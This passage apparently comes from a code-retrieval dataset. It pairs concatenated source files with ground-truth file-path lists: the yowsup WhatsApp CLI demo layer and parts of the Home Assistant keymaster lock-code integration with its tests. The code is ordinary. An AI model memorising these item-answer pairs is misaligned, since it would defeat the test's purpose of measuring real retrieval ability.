originalIqEntity):\n                self.output(\"Status updated successfully\")\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error updating status\")\n\n            entity = SetStatusIqProtocolEntity(text)\n            self._sendIq(entity, onSuccess, onError)\n\n    @clicmd(\"Get profile picture for contact\")\n    def contact_picture(self, jid):\n        if self.assertConnected():\n            entity = GetPictureIqProtocolEntity(self.aliasToJid(jid), preview=False)\n            self._sendIq(entity, self.onGetContactPictureResult)\n\n    @clicmd(\"Get profile picture preview for contact\")\n    def contact_picturePreview(self, jid):\n        if self.assertConnected():\n            entity = GetPictureIqProtocolEntity(self.aliasToJid(jid), preview=True)\n            self._sendIq(entity, self.onGetContactPictureResult)\n\n    @clicmd(\"Get lastseen for contact\")\n    def contact_lastseen(self, jid):\n        if self.assertConnected():\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"%s lastseen %s seconds ago\" % (resultIqEntity.getFrom(), resultIqEntity.getSeconds()))\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error getting lastseen information for %s\" % originalIqEntity.getTo())\n\n            entity = LastseenIqProtocolEntity(self.aliasToJid(jid))\n            self._sendIq(entity, onSuccess, onError)\n\n    @clicmd(\"Set profile picture\")\n    def profile_setPicture(self, path):\n        if self.assertConnected():\n            with PILOptionalModule(failMessage = \"No PIL library installed, try install pillow\") as imp:\n                Image = imp(\"Image\")\n                def onSuccess(resultIqEntity, originalIqEntity):\n                    self.output(\"Profile picture updated successfully\")\n\n                def onError(errorIqEntity, originalIqEntity):\n                    logger.error(\"Error updating profile picture\")\n\n\n\n                src = Image.open(path)\n                pictureData = src.resize((640, 640)).tobytes(\"jpeg\", \"RGB\")\n                picturePreview = src.resize((96, 96)).tobytes(\"jpeg\", \"RGB\")\n                iq = SetPictureIqProtocolEntity(self.getOwnJid(), picturePreview, pictureData)\n                self._sendIq(iq, onSuccess, onError)\n\n    @clicmd(\"Get profile privacy\")\n    def profile_getPrivacy(self):\n        if self.assertConnected():\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"Profile privacy is: %s\" %(resultIqEntity))\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error getting profile privacy\")\n\n            iq = GetPrivacyIqProtocolEntity()\n            self._sendIq(iq, onSuccess, onError)\n\n    @clicmd(\"Profile privacy. value=all|contacts|none names=profile|status|last. Names are comma separated, defaults to all.\")\n    def profile_setPrivacy(self, value=\"all\", names=None):\n        if self.assertConnected():\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"Profile privacy set to: %s\" %(resultIqEntity))\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error setting profile privacy\")\n            try:\n                names = [name for name in names.split(',')] if names else None\n                iq = SetPrivacyIqProtocolEntity(value, names)\n                self._sendIq(iq, onSuccess, onError)\n            except Exception as inst:\n                self.output(inst.message)\n                return self.print_usage()\n\n\n\n\n    @clicmd(\"List all groups you belong to\", 5)\n    def groups_list(self):\n        if self.assertConnected():\n            entity = ListGroupsIqProtocolEntity()\n            self.toLower(entity)\n\n    @clicmd(\"Leave a group you belong to\", 4)\n    def group_leave(self, group_jid):\n        if self.assertConnected():\n            entity = LeaveGroupsIqProtocolEntity([self.aliasToJid(group_jid)])\n            self.toLower(entity)\n\n    @clicmd(\"Create a new group with the specified subject and participants. Jids are a comma separated list but optional.\", 3)\n    def groups_create(self, subject, jids = None):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')] if jids else []\n            entity = CreateGroupsIqProtocolEntity(subject, participants=jids)\n            self.toLower(entity)\n\n    @clicmd(\"Invite to group. Jids are a comma separated list\")\n    def group_invite(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = AddParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Promote admin of a group. Jids are a comma separated list\")\n    def group_promote(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = PromoteParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Remove admin of a group. Jids are a comma separated list\")\n    def group_demote(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = DemoteParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Kick from group. Jids are a comma separated list\")\n    def group_kick(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = RemoveParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Change group subject\")\n    def group_setSubject(self, group_jid, subject):\n        if self.assertConnected():\n            entity = SubjectGroupsIqProtocolEntity(self.aliasToJid(group_jid), subject)\n            self.toLower(entity)\n\n    @clicmd(\"Set group picture\")\n    def group_picture(self, group_jid, path):\n        if self.assertConnected():\n            with PILOptionalModule(failMessage = self.__class__.FAIL_OPT_PILLOW) as imp:\n                Image = imp(\"Image\")\n\n                def onSuccess(resultIqEntity, originalIqEntity):\n                    self.output(\"Group picture updated successfully\")\n\n                def onError(errorIqEntity, originalIqEntity):\n                    logger.error(\"Error updating Group picture\")\n\n\n\n                src = Image.open(path)\n                pictureData = src.resize((640, 640)).tobytes(\"jpeg\", \"RGB\")\n                picturePreview = src.resize((96, 96)).tobytes(\"jpeg\", \"RGB\")\n                iq = SetPictureIqProtocolEntity(self.aliasToJid(group_jid), picturePreview, pictureData)\n                self._sendIq(iq, onSuccess, onError)\n\n\n    @clicmd(\"Get group info\")\n    def group_info(self, group_jid):\n        if self.assertConnected():\n            entity = InfoGroupsIqProtocolEntity(self.aliasToJid(group_jid))\n            self.toLower(entity)\n\n    @clicmd(\"Get shared keys\")\n    def keys_get(self, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = GetKeysIqProtocolEntity(jids)\n            self.toLower(entity)\n\n    @clicmd(\"Send init seq\")\n    def seq(self):\n        priv = PrivacyListIqProtocolEntity()\n        self.toLower(priv)\n        push = PushIqProtocolEntity()\n        self.toLower(push)\n        props = PropsIqProtocolEntity()\n        self.toLower(props)\n        crypto = CryptoIqProtocolEntity()\n        self.toLower(crypto)\n\n    @clicmd(\"Delete your account\")\n    def account_delete(self):\n        if self.assertConnected():\n            if self.accountDelWarnings < self.__class__.ACCOUNT_DEL_WARNINGS:\n                self.accountDelWarnings += 1\n                remaining = self.__class__.ACCOUNT_DEL_WARNINGS - self.accountDelWarnings\n                self.output(\"Repeat delete command another %s times to send the delete request\" % remaining, tag=\"Account delete Warning !!\", prompt = False)\n            else:\n                entity = UnregisterIqProtocolEntity()\n                self.toLower(entity)\n\n    @clicmd(\"Send message to a friend\")\n    def message_send(self, number, content):\n        if self.assertConnected():\n            outgoingMessage = TextMessageProtocolEntity(content, to=self.aliasToJid(number))\n            self.toLower(outgoingMessage)\n\n    @clicmd(\"Broadcast message. numbers should comma separated phone numbers\")\n    def message_broadcast(self, numbers, content):\n        if self.assertConnected():\n            jids = [self.aliasToJid(number) for number in numbers.split(',')]\n            outgoingMessage = BroadcastTextMessage(jids, content)\n            self.toLower(outgoingMessage)\n\n\n    def message_read(self, message_id):\n        pass\n\n\n    def message_delivered(self, message_id):\n        pass\n\n    @clicmd(\"Send a video with optional caption\")\n    def video_send(self, number, path, caption = None):\n        self.media_send(number, path, RequestUploadIqProtocolEntity.MEDIA_TYPE_VIDEO)\n\n    @clicmd(\"Send an image with optional caption\")\n    def image_send(self, number, path, caption = None):\n        self.media_send(number, path, RequestUploadIqProtocolEntity.MEDIA_TYPE_IMAGE)\n\n    @clicmd(\"Send audio file\")\n    def audio_send(self, number, path):\n        self.media_send(number, path, RequestUploadIqProtocolEntity.MEDIA_TYPE_AUDIO)\n\n    def media_send(self, number, path, mediaType, caption = None):\n        if self.assertConnected():\n            jid = self.aliasToJid(number)\n            entity = RequestUploadIqProtocolEntity(mediaType, filePath=path)\n            successFn = lambda successEntity, originalEntity: self.onRequestUploadResult(jid, mediaType, path, successEntity, originalEntity, caption)\n            errorFn = lambda errorEntity, originalEntity: self.onRequestUploadError(jid, path, errorEntity, originalEntity)\n            self._sendIq(entity, successFn, errorFn)\n\n    @clicmd(\"Send typing state\")\n    def state_typing(self, jid):\n        if self.assertConnected():\n            entity = OutgoingChatstateProtocolEntity(ChatstateProtocolEntity.STATE_TYPING, self.aliasToJid(jid))\n            self.toLower(entity)\n\n    @clicmd(\"Request contacts statuses\")\n    def statuses_get(self, contacts):\n\n        def on_success(entity, original_iq_entity):\n\n            status_outs = []\n            for jid, status_info in entity.statuses.items():\n                status_outs.append(\"[user=%s status=%s last_updated=%s]\" % (jid, status_info[0], status_info[1]))\n            self.output(\"\\n\".join(status_outs), tag=\"statuses_get result\")\n\n        def on_error(entity, original_iq):\n\n            logger.error(\"Failed to get statuses\")\n\n        if self.assertConnected():\n            entity = GetStatusesIqProtocolEntity([self.aliasToJid(c) for c in contacts.split(',')])\n            self._sendIq(entity, on_success, on_error)\n\n    @clicmd(\"Send paused state\")\n    def state_paused(self, jid):\n        if self.assertConnected():\n            entity = OutgoingChatstateProtocolEntity(ChatstateProtocolEntity.STATE_PAUSED, self.aliasToJid(jid))\n            self.toLower(entity)\n\n    @clicmd(\"Sync contacts, contacts should be comma separated phone numbers, with no spaces\")\n    def contacts_sync(self, contacts):\n        if self.assertConnected():\n            entity = GetSyncIqProtocolEntity(contacts.split(','))\n            self.toLower(entity)\n\n    @clicmd(\"Disconnect\")\n    def disconnect(self):\n        if self.assertConnected():\n\n            self.broadcastEvent(YowLayerEvent(YowNetworkLayer.EVENT_STATE_DISCONNECT))\n\n    @clicmd(\"Quick login\")\n    def L(self):\n        if self.connected:\n            return self.output(\"Already connected, disconnect first\")\n        threading.Thread(target=lambda: self.getLayerInterface(YowNetworkLayer).connect()).start()\n        return True\n\n\n\n    @ProtocolEntityCallback(\"presence\")\n    def onPresenceChange(self, entity):\n        status=\"offline\"\n        if entity.getType() is None:\n            status=\"online\"\n\n        lastseen = entity.getLast()\n        if status is \"offline\" and lastseen is \"deny\":\n            lastseen = time.time()\n\n        self.output(\"%s %s %s lastseen at: %s\" % (entity.getFrom(), entity.getTag(), status, lastseen))\n\n    @ProtocolEntityCallback(\"chatstate\")\n    def onChatstate(self, entity):\n        print(entity)\n\n    @ProtocolEntityCallback(\"iq\")\n    def onIq(self, entity):\n        if not isinstance(entity, ResultStatusesIqProtocolEntity):\n            print(entity)\n\n    @ProtocolEntityCallback(\"receipt\")\n    def onReceipt(self, entity):\n        self.toLower(entity.ack())\n\n    @ProtocolEntityCallback(\"ack\")\n    def onAck(self, entity):\n\n\n        if entity.getClass() == \"message\":\n            self.output(entity.getId(), tag = \"Sent\")\n\n\n    @ProtocolEntityCallback(\"success\")\n    def onSuccess(self, entity):\n        self.connected = True\n        self.output(\"Logged in!\", \"Auth\", prompt = False)\n        self.notifyInputThread()\n\n    @ProtocolEntityCallback(\"failure\")\n    def onFailure(self, entity):\n        self.connected = False\n        self.output(\"Login Failed, reason: %s\" % entity.getReason(), prompt = False)\n\n    @ProtocolEntityCallback(\"notification\")\n    def onNotification(self, notification):\n        notificationData = notification.__str__()\n        if notificationData:\n            self.output(notificationData, tag = \"Notification\")\n        else:\n            self.output(\"From :%s, Type: %s\" % (self.jidToAlias(notification.getFrom()), notification.getType()), tag = \"Notification\")\n\n    @ProtocolEntityCallback(\"message\")\n    def onMessage(self, message):\n        messageOut = \"\"\n        if message.getType() == \"text\":\n\n            messageOut = self.getTextMessageBody(message)\n        elif message.getType() == \"media\":\n            messageOut = self.getMediaMessageBody(message)\n        else:\n            messageOut = \"Unknown message type %s \" % message.getType()\n            print(messageOut.toProtocolTreeNode())\n\n        formattedDate = datetime.datetime.fromtimestamp(message.getTimestamp()).strftime('%d-%m-%Y %H:%M')\n        sender = message.getFrom() if not message.isGroupMessage() else \"%s/%s\" % (message.getParticipant(False), message.getFrom())\n\n        output = self.__class__.MESSAGE_FORMAT % (sender, formattedDate, message.getId(), messageOut)\n\n        self.output(output, tag = None, prompt = not self.sendReceipts)\n        if self.sendReceipts:\n            self.toLower(message.ack(self.sendRead))\n            self.output(\"Sent delivered receipt\"+\" and Read\" if self.sendRead else \"\", tag = \"Message %s\" % message.getId())\n\n    def getTextMessageBody(self, message):\n        if isinstance(message, TextMessageProtocolEntity):\n            return message.conversation\n        elif isinstance(message, ExtendedTextMessageProtocolEntity):\n            return str(message.message_attributes.extended_text)\n        else:\n            raise NotImplementedError()\n\n    def getMediaMessageBody(self, message):\n\n        return str(message.message_attributes)\n\n    def getDownloadableMediaMessageBody(self, message):\n        return \"[media_type={media_type}, length={media_size}, url={media_url}, key={media_key}]\".format(\n            media_type=message.media_type,\n            media_size=message.file_length,\n            media_url=message.url,\n            media_key=base64.b64encode(message.media_key)\n        )\n\n    def doSendMedia(self, mediaType, filePath, url, to, ip = None, caption = None):\n        if mediaType == RequestUploadIqProtocolEntity.MEDIA_TYPE_IMAGE:\n        \tentity = ImageDownloadableMediaMessageProtocolEntity.fromFilePath(filePath, url, ip, to, caption = caption)\n        elif mediaType == RequestUploadIqProtocolEntity.MEDIA_TYPE_AUDIO:\n        \tentity = AudioDownloadableMediaMessageProtocolEntity.fromFilePath(filePath, url, ip, to)\n        elif mediaType == RequestUploadIqProtocolEntity.MEDIA_TYPE_VIDEO:\n        \tentity = VideoDownloadableMediaMessageProtocolEntity.fromFilePath(filePath, url, ip, to, caption = caption)\n        self.toLower(entity)\n\n    def __str__(self):\n        return \"CLI Interface Layer\"\n\n\n\n    def onRequestUploadResult(self, jid, mediaType, filePath, resultRequestUploadIqProtocolEntity, requestUploadIqProtocolEntity, caption = None):\n\n        if resultRequestUploadIqProtocolEntity.isDuplicate():\n            self.doSendMedia(mediaType, filePath, resultRequestUploadIqProtocolEntity.getUrl(), jid,\n                             resultRequestUploadIqProtocolEntity.getIp(), caption)\n        else:\n            successFn = lambda filePath, jid, url: self.doSendMedia(mediaType, filePath, url, jid, resultRequestUploadIqProtocolEntity.getIp(), caption)\n            mediaUploader = MediaUploader(jid, self.getOwnJid(), filePath,\n                                      resultRequestUploadIqProtocolEntity.getUrl(),\n                                      resultRequestUploadIqProtocolEntity.getResumeOffset(),\n                                      successFn, self.onUploadError, self.onUploadProgress, asynchronous=False)\n            mediaUploader.start()\n\n    def onRequestUploadError(self, jid, path, errorRequestUploadIqProtocolEntity, requestUploadIqProtocolEntity):\n        logger.error(\"Request upload for file %s for %s failed\" % (path, jid))\n\n    def onUploadError(self, filePath, jid, url):\n        logger.error(\"Upload file %s to %s for %s failed!\" % (filePath, url, jid))\n\n    def onUploadProgress(self, filePath, jid, url, progress):\n        sys.stdout.write(\"%s => %s, %d%% \\r\" % (os.path.basename(filePath), jid, progress))\n        sys.stdout.flush()\n\n    def onGetContactPictureResult(self, resultGetPictureIqProtocolEntiy, getPictureIqProtocolEntity):\n\n\n\n\n\n\n        pass\n\n    @clicmd(\"Print this message\")\n    def help(self):\n        self.print_usage()\n",
        "gt": [
            "'yowsup/yowsup/layers/protocol_chatstate/protocolentities/chatstate_incoming.py'",
            "'yowsup/yowsup/layers/protocol_chatstate/protocolentities/__init__.py'",
            "'yowsup/yowsup/demos/cli/layer.py'",
            "'yowsup/yowsup/demos/cli/stack.py'",
            "'yowsup/yowsup/demos/cli/__init__.py'"
        ]
    },
    {
        "files": [
            "'keymaster/custom_components/keymaster/lock.py'",
            "'keymaster/tests/test_services.py'",
            "'keymaster/custom_components/keymaster/__init__.py'"
        ],
        "content": "'keymaster/custom_components/keymaster/lock.py'\n:\nfrom dataclasses import dataclass\nfrom typing import Optional\n\nfrom homeassistant.helpers.device_registry import DeviceEntry\nfrom homeassistant.helpers.entity_registry import EntityRegistry\n\n\n@dataclass\nclass KeymasterLock:\n\n\n    lock_name: str\n    lock_entity_id: str\n    alarm_level_or_user_code_entity_id: Optional[str]\n    alarm_type_or_access_control_entity_id: Optional[str]\n    ent_reg: EntityRegistry\n    door_sensor_entity_id: Optional[str] = None\n    zwave_js_lock_node = None\n    zwave_js_lock_device: DeviceEntry = None\n    parent: Optional[str] = None\n\n'keymaster/tests/test_services.py'\n:\nimport errno\nfrom unittest.mock import patch\n\nimport pytest\nfrom pytest_homeassistant_custom_component.common import MockConfigEntry\n\nfrom custom_components.keymaster import (\n    SERVICE_ADD_CODE,\n    SERVICE_CLEAR_CODE,\n    SERVICE_GENERATE_PACKAGE,\n    SERVICE_REFRESH_CODES,\n)\nfrom custom_components.keymaster.const import DOMAIN\n\nfrom .const import CONFIG_DATA, CONFIG_DATA_910, CONFIG_DATA_ALT\n\nKWIKSET_910_LOCK_ENTITY = \"lock.smart_code_with_home_connect_technology\"\n\n\nasync def test_generate_package_files(hass, caplog):\n\n    entry = MockConfigEntry(\n        domain=DOMAIN, title=\"frontdoor\", data=CONFIG_DATA, version=2\n    )\n\n    entry.add_to_hass(hass)\n    assert await hass.config_entries.async_setup(entry.entry_id)\n    await hass.async_block_till_done()\n\n    servicedata = {\n        \"lockname\": \"backdoor\",\n    }\n    with pytest.raises(ValueError):\n        await hass.services.async_call(\n            DOMAIN, SERVICE_GENERATE_PACKAGE, servicedata, blocking=True\n        )\n    await hass.async_block_till_done()\n\n\n    with patch(\n        \"custom_components.keymaster.services.os\", autospec=True\n    ) as mock_os, patch(\n        \"custom_components.keymaster.services.output_to_file_from_template\"\n    ):\n        mock_os.path.isdir.return_value = False\n        mock_os.makedirs.side_effect = OSError(errno.EEXIST, \"error\")\n        servicedata = {\n            \"lockname\": \"frontdoor\",\n        }\n        await hass.services.async_call(DOMAIN, SERVICE_GENERATE_PACKAGE, servicedata)\n        await hass.async_block_till_done()\n        mock_os.path.isdir.assert_called_once\n        mock_os.makedirs.assert_called_once\n        assert \"Error creating directory:\" in caplog.text\n\n\nasync def test_add_code_zwave_js(hass, client, lock_kwikset_910, integration):\n\n\n    node = lock_kwikset_910\n\n    entry = MockConfigEntry(\n        domain=DOMAIN, title=\"frontdoor\", data=CONFIG_DATA_910, version=2\n    )\n\n    entry.add_to_hass(hass)\n    assert await hass.config_entries.async_setup(entry.entry_id)\n    await hass.async_block_till_done()\n\n\n    assert \"zwave_js\" in hass.config.components\n\n\n    assert hass.states.get(KWIKSET_910_LOCK_ENTITY).state == \"locked\"\n\n\n    servicedata = {\n        \"entity_id\": KWIKSET_910_LOCK_ENTITY,\n        \"code_slot\": 1,\n        \"usercode\": \"1234\",\n    }\n    await hass.services.async_call(DOMAIN, SERVICE_ADD_CODE, servicedata)\n    await hass.async_block_till_done()\n\n    assert len(client.async_send_command.call_args_list) == 1\n    args = client.async_send_command.call_args[0][0]\n    assert args[\"command\"] == \"node.set_value\"\n    assert args[\"nodeId\"] == 14\n    assert args[\"valueId\"] == {\n        \"ccVersion\": 1,\n        \"commandClassName\": \"User Code\",\n        \"commandClass\": 99,\n        \"endpoint\": 0,\n        \"property\": \"userCode\",\n        \"propertyName\": \"userCode\",\n        \"propertyKey\": 1,\n        \"propertyKeyName\": \"1\",\n        \"metadata\": {\n            \"type\": \"string\",\n            \"readable\": True,\n            \"writeable\": True,\n            \"minLength\": 4,\n            \"maxLength\": 10,\n            \"label\": \"User Code (1)\",\n        },\n        \"value\": \"123456\",\n    }\n    assert args[\"value\"] == \"1234\"\n\n\nasync def test_clear_code_zwave_js(hass, client, lock_kwikset_910, integration):\n\n\n    node = lock_kwikset_910\n\n    entry = MockConfigEntry(\n        domain=DOMAIN, title=\"frontdoor\", data=CONFIG_DATA_910, version=2\n    )\n\n    entry.add_to_hass(hass)\n    assert await hass.config_entries.async_setup(entry.entry_id)\n    await hass.async_block_till_done()\n\n\n    assert \"zwave_js\" in hass.config.components\n\n\n    assert hass.states.get(KWIKSET_910_LOCK_ENTITY).state == \"locked\"\n\n\n    servicedata = {\n        \"entity_id\": KWIKSET_910_LOCK_ENTITY,\n        \"code_slot\": 1,\n    }\n    await hass.services.async_call(DOMAIN, SERVICE_CLEAR_CODE, servicedata)\n    await hass.async_block_till_done()\n\n    assert len(client.async_send_command.call_args_list) == 1\n    args = client.async_send_command.call_args[0][0]\n    assert args[\"command\"] == \"node.set_value\"\n    assert args[\"nodeId\"] == 14\n    assert args[\"valueId\"] == {\n        \"ccVersion\": 1,\n        \"commandClassName\": \"User Code\",\n        \"commandClass\": 99,\n        \"endpoint\": 0,\n        \"property\": \"userIdStatus\",\n        \"propertyName\": \"userIdStatus\",\n        \"propertyKey\": 1,\n        \"propertyKeyName\": \"1\",\n        \"metadata\": {\n            \"type\": \"number\",\n            \"readable\": True,\n            \"writeable\": True,\n            \"label\": \"User ID status (1)\",\n            \"states\": {\n                \"0\": \"Available\",\n                \"1\": \"Enabled\",\n                \"2\": \"Disabled\",\n            },\n        },\n        \"value\": 1,\n    }\n    assert args[\"value\"] == 0\n\n'keymaster/custom_components/keymaster/__init__.py'\n:\nimport asyncio\nfrom datetime import timedelta\nimport functools\nimport logging\nfrom typing import Any, Dict, List, Optional, Union\n\nimport voluptuous as vol\n\nfrom homeassistant.components.persistent_notification import async_create, async_dismiss\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.const import (\n    ATTR_ENTITY_ID,\n    EVENT_HOMEASSISTANT_STARTED,\n    STATE_LOCKED,\n    STATE_ON,\n    STATE_UNLOCKED,\n)\nfrom homeassistant.core import Config, CoreState, Event, HomeAssistant, ServiceCall\nfrom homeassistant.helpers.dispatcher import async_dispatcher_send\nfrom homeassistant.helpers.entity_registry import (\n    EntityRegistry,\n    async_get as async_get_entity_registry,\n)\nfrom homeassistant.helpers.event import async_track_state_change\nfrom homeassistant.helpers.update_coordinator import DataUpdateCoordinator, UpdateFailed\nfrom homeassistant.util import slugify\n\nfrom .binary_sensor import generate_binary_sensor_name\nfrom .const import (\n    ATTR_CODE_SLOT,\n    ATTR_NAME,\n    ATTR_USER_CODE,\n    CHILD_LOCKS,\n    CONF_ALARM_LEVEL,\n    CONF_ALARM_LEVEL_OR_USER_CODE_ENTITY_ID,\n    CONF_ALARM_TYPE,\n    CONF_ALARM_TYPE_OR_ACCESS_CONTROL_ENTITY_ID,\n    CONF_CHILD_LOCKS_FILE,\n    CONF_ENTITY_ID,\n    CONF_GENERATE,\n    CONF_HIDE_PINS,\n    CONF_LOCK_ENTITY_ID,\n    CONF_LOCK_NAME,\n    CONF_PARENT,\n    CONF_PATH,\n    CONF_SLOTS,\n    CONF_START,\n    COORDINATOR,\n    DEFAULT_HIDE_PINS,\n    DOMAIN,\n    INTEGRATION,\n    ISSUE_URL,\n    PLATFORMS,\n    PRIMARY_LOCK,\n    UNSUB_LISTENERS,\n    VERSION,\n)\nfrom .exceptions import (\n    NoNodeSpecifiedError,\n    NotFoundError as NativeNotFoundError,\n    NotSupportedError as NativeNotSupportedError,\n    ZWaveIntegrationNotConfiguredError,\n    ZWaveNetworkNotReady,\n)\nfrom .helpers import (\n    async_reload_package_platforms,\n    async_reset_code_slot_if_pin_unknown,\n    async_using_zwave_js,\n    delete_folder,\n    delete_lock_and_base_folder,\n    generate_keymaster_locks,\n    get_code_slots_list,\n    handle_state_change,\n    handle_zwave_js_event,\n)\nfrom .lock import KeymasterLock\nfrom .services import (\n    add_code,\n    clear_code,\n    generate_package_files,\n    init_child_locks,\n    refresh_codes,\n)\n\ntry:\n    from zwave_js_server.const.command_class.lock import ATTR_IN_USE, ATTR_USERCODE\n    from zwave_js_server.model.node import Node as ZwaveJSNode\n    from zwave_js_server.util.lock import get_usercode_from_node, get_usercodes\n\n    from homeassistant.components.zwave_js import ZWAVE_JS_NOTIFICATION_EVENT\nexcept (ModuleNotFoundError, ImportError):\n    pass\n\n_LOGGER = logging.getLogger(__name__)\n\nSERVICE_GENERATE_PACKAGE = \"generate_package\"\nSERVICE_ADD_CODE = \"add_code\"\nSERVICE_CLEAR_CODE = \"clear_code\"\nSERVICE_REFRESH_CODES = \"refresh_codes\"\n\nSET_USERCODE = \"set_usercode\"\nCLEAR_USERCODE = \"clear_usercode\"\n\n\nasync def homeassistant_started_listener(\n    hass: HomeAssistant,\n    config_entry: ConfigEntry,\n    locks_to_watch: List[KeymasterLock],\n    evt: Event = None,\n):\n\n\n    hass.data[DOMAIN][config_entry.entry_id][UNSUB_LISTENERS].append(\n        async_track_state_change(\n            hass,\n            [lock.lock_entity_id for lock in locks_to_watch],\n            functools.partial(handle_state_change, hass, config_entry),\n            from_state=[STATE_LOCKED, STATE_UNLOCKED],\n            to_state=[STATE_LOCKED, STATE_UNLOCKED],\n        )\n    )\n\n\nasync def async_setup(hass: HomeAssistant, config: Config) -> bool:\n\n    return True\n\n\nasync def async_setup_entry(hass: HomeAssistant, config_entry: ConfigEntry) -> bool:\n\n    hass.data.setdefault(DOMAIN, {})\n    _LOGGER.info(\n        \"Version %s is starting, if you have any issues please report\" \" them here: %s\",\n        VERSION,\n        ISSUE_URL,\n    )\n    should_generate_package = config_entry.data.get(CONF_GENERATE)\n\n    updated_config = config_entry.data.copy()\n\n\n    updated_config.pop(CONF_GENERATE, None)\n\n\n\n\n    config_path = hass.config.path()\n    if config_entry.data[CONF_PATH].startswith(config_path):\n        num_chars_config_path = len(config_path)\n        updated_config[CONF_PATH] = updated_config[CONF_PATH][num_chars_config_path:]\n\n        updated_config[CONF_PATH] = updated_config[CONF_PATH].lstrip(\"/\").lstrip(\"\\\\\")\n\n    if \"parent\" not in config_entry.data.keys():\n        updated_config[CONF_PARENT] = None\n    elif config_entry.data[CONF_PARENT] == \"(none)\":\n        updated_config[CONF_PARENT] = None\n\n    if updated_config != config_entry.data:\n        hass.config_entries.async_update_entry(config_entry, data=updated_config)\n\n    config_entry.add_update_listener(update_listener)\n\n    primary_lock, child_locks = await generate_keymaster_locks(hass, config_entry)\n\n    hass.data[DOMAIN][config_entry.entry_id] = {\n        PRIMARY_LOCK: primary_lock,\n        CHILD_LOCKS: child_locks,\n        UNSUB_LISTENERS: [],\n    }\n    coordinator = LockUsercodeUpdateCoordinator(\n        hass, config_entry, async_get_entity_registry(hass)\n    )\n    hass.data[DOMAIN][config_entry.entry_id][COORDINATOR] = coordinator\n\n\n    async def _refresh_codes(service: ServiceCall) -> None:\n\n        _LOGGER.debug(\"Refresh Codes service: %s\", service)\n        entity_id = service.data[ATTR_ENTITY_ID]\n        instance_id = 1\n        await refresh_codes(hass, entity_id, instance_id)\n\n    hass.services.async_register(\n        DOMAIN,\n        SERVICE_REFRESH_CODES,\n        _refresh_codes,\n        schema=vol.Schema(\n            {\n                vol.Required(ATTR_ENTITY_ID): vol.Coerce(str),\n            }\n        ),\n    )\n\n\n    async def _add_code(service: ServiceCall) -> None:\n\n        _LOGGER.debug(\"Add Code service: %s\", service)\n        entity_id = service.data[ATTR_ENTITY_ID]\n        code_slot = service.data[ATTR_CODE_SLOT]\n        usercode = service.data[ATTR_USER_CODE]\n        await add_code(hass, entity_id, code_slot, usercode)\n\n    hass.services.async_register(\n        DOMAIN,\n        SERVICE_ADD_CODE,\n        _add_code,\n        schema=vol.Schema(\n            {\n                vol.Required(ATTR_ENTITY_ID): vol.Coerce(str),\n                vol.Required(ATTR_CODE_SLOT): vol.Coerce(int),\n                vol.Required(ATTR_USER_CODE): vol.Coerce(str),\n            }\n        ),\n    )\n\n\n    async def _clear_code(service: ServiceCall) -> None:\n\n        _LOGGER.debug(\"Clear Code service: %s\", service)\n        entity_id = service.data[ATTR_ENTITY_ID]\n        code_slot = service.data[ATTR_CODE_SLOT]\n        await clear_code(hass, entity_id, code_slot)\n\n    hass.services.async_register(\n        DOMAIN,\n        SERVICE_CLEAR_CODE,\n        _clear_code,\n        schema=vol.Schema(\n            {\n                vol.Required(ATTR_ENTITY_ID): vol.Coerce(str),\n                vol.Required(ATTR_CODE_SLOT): vol.Coerce(int),\n            }\n        ),\n    )\n\n\n    def _generate_package(service: ServiceCall) -> None:\n\n        _LOGGER.debug(\"DEBUG: %s\", service)\n        name = service.data[ATTR_NAME]\n        generate_package_files(hass, name)\n\n    hass.services.async_register(\n        DOMAIN,\n        SERVICE_GENERATE_PACKAGE,\n        _generate_package,\n        schema=vol.Schema({vol.Optional(ATTR_NAME): vol.Coerce(str)}),\n    )\n\n    await async_reset_code_slot_if_pin_unknown(\n        hass,\n        primary_lock.lock_name,\n        config_entry.data[CONF_SLOTS],\n        config_entry.data[CONF_START],\n    )\n\n    for platform in PLATFORMS:\n        hass.async_create_task(\n            hass.config_entries.async_forward_entry_setup(config_entry, platform)\n        )\n\n\n    if should_generate_package:\n        servicedata = {\"lockname\": primary_lock.lock_name}\n        await hass.services.async_call(\n            DOMAIN, SERVICE_GENERATE_PACKAGE, servicedata, blocking=True\n        )\n\n    if async_using_zwave_js(lock=primary_lock):\n\n        hass.data[DOMAIN][config_entry.entry_id][UNSUB_LISTENERS].append(\n            hass.bus.async_listen(\n                ZWAVE_JS_NOTIFICATION_EVENT,\n                functools.partial(handle_zwave_js_event, hass, config_entry),\n            )\n        )\n\n\n\n    locks_to_watch = []\n    for lock in [primary_lock, *child_locks]:\n        if lock.alarm_level_or_user_code_entity_id not in (\n            None,\n            \"sensor.fake\",\n        ) and lock.alarm_type_or_access_control_entity_id not in (None, \"sensor.fake\"):\n            locks_to_watch.append(lock)\n\n    if locks_to_watch:\n        if hass.state == CoreState.running:\n            await homeassistant_started_listener(hass, config_entry, locks_to_watch)\n        else:\n            hass.bus.async_listen_once(\n                EVENT_HOMEASSISTANT_STARTED,\n                functools.partial(\n                    homeassistant_started_listener, hass, config_entry, 